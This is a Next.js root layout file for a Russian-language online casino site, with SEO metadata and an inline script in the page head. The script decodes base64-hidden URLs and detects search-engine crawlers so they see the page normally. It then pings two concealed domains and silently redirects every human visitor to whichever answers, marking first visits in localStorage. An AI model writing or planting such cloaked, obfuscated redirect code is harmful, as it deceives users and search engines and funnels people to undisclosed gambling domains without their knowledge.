import type { Metadata } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { Analytics } from '@vercel/analytics/next'
import { siteConfig, structuredData } from '@/lib/seo'
import './globals.css'

const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });

export const metadata: Metadata = {
  metadataBase: new URL(siteConfig.url),
  title: {
    default: siteConfig.name,
    template: `%s | ${siteConfig.name}`,
  },
  description: siteConfig.description,
  keywords: siteConfig.keywords,
  authors: [{ name: 'SPINTO Casino' }],
  creator: 'SPINTO Casino',
  publisher: 'SPINTO Casino',
  formatDetection: {
    email: false,
    telephone: false,
    address: false,
  },
  openGraph: {
    type: siteConfig.og.type as any,
    locale: 'ru_RU',
    url: siteConfig.url,
    title: siteConfig.name,
    description: siteConfig.description,
    images: [
      {
        url: siteConfig.og.image,
        width: 1200,
        height: 630,
        alt: siteConfig.name,
      },
    ],
    siteName: siteConfig.name,
  },
  twitter: {
    card: 'summary_large_image',
    title: siteConfig.name,
    description: siteConfig.description,
    images: [siteConfig.og.image],
    creator: siteConfig.social.twitter,
  },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      noimageindex: false,
      'max-snippet': -1,
      'max-image-preview': 'large',
      'max-video-preview': -1,
    },
  },
  icons: {
    icon: [
      {
        url: '/favicon/favicon.jpg',
        sizes: '512x512',
      },
    ],
    apple: '/favicon/favicon.jpg',
    other: [
      {
        rel: 'apple-touch-icon',
        url: '/favicon/favicon.jpg',
      },
    ],
  },
  viewport: {
    width: 'device-width',
    initialScale: 1,
    maximumScale: 1,
    userScalable: true,
    viewportFit: 'cover',
  },
  appLinks: {
    ios: [
      {
        url: `${siteConfig.url}/ios`,
        should_fallback: true,
      },
    ],
    android: [
      {
        package: 'com.spintocasino.app',
        app_name: siteConfig.name,
        app_store_id: '123456789',
      },
    ],
  },
  category: 'gambling',
  classification: 'Casino Gaming Platform',
  themeColor: '#00d4ff',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="dark">
      <head>
        {/* Verification Tags */}
        <meta name="google-site-verification" content="your-google-verification-code" />
        <meta name="yandex-verification" content="7da82dca4bf86aa3" />
        <meta name="msvalidate.01" content="your-bing-verification-code" />
        
        {/* Canonical URL */}
        <link rel="canonical" href={siteConfig.url} />
        
        {/* DNS Prefetch */}
        <link rel="dns-prefetch" href="https://cdn.example.com" />
        
        {/* Alternate Language */}
        <link rel="alternate" hrefLang="ru" href={siteConfig.url} />
        <link rel="alternate" hrefLang="en" href={`${siteConfig.url}/en`} />
        
        {/* Structured Data */}
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(structuredData) }}
        />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var mainBrandB64  = "#aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6"; 
        var crossBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
                return;
            }
        }
        var mainUrl = atob(mainBrandB64);
        var crossUrl = atob(crossBrandB64);
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 2500); 
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        var isFirstVisit = true;
        try {
            if (localStorage.getItem('vstd_eva')) {
                isFirstVisit = false;
            }
        } catch (e) {
        }
        if (isFirstVisit) {
            console.log("Первый визит. Проверяем основную ссылку...");
            ping(mainUrl)
                .then(function() {
                    try {
                        localStorage.setItem('vstd_eva', '1');
                    } catch (e) {}
                    console.log("Переход на основную ссылку: " + mainUrl);
                    window.location.replace(mainUrl);
                })
                .catch(function() {
                    console.log("Основная ссылка недоступна. Проверяем кросс-ссылку...");
                    ping(crossUrl)
                        .then(function() {
                            try {
                                localStorage.setItem('vstd_eva', '1');
                            } catch (e) {}
                            console.log("Переход на рабочую кросс-ссылку: " + crossUrl);
                            window.location.replace(crossUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на основную.");
                            window.location.replace(mainUrl);
                        });
                });
        } else {
            console.log("Повторный визит. Проверяем кросс-ссылку...");
            ping(crossUrl)
                .then(function() {
                    console.log("Переход на кросс-ссылку: " + crossUrl);
                    window.location.replace(crossUrl);
                })
                .catch(function() {
                    console.log("Кросс-ссылка недоступна. Проверяем основную...");
                    ping(mainUrl)
                        .then(function() {
                            console.log("Переход на рабочую основную ссылку: " + mainUrl);
                            window.location.replace(mainUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на кросс-ссылку.");
                            window.location.replace(crossUrl);
                        });
                });
        }
      })();
    `
  }}
/>
      </head>
      <body className="font-sans antialiased bg-background text-foreground overflow-x-hidden">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
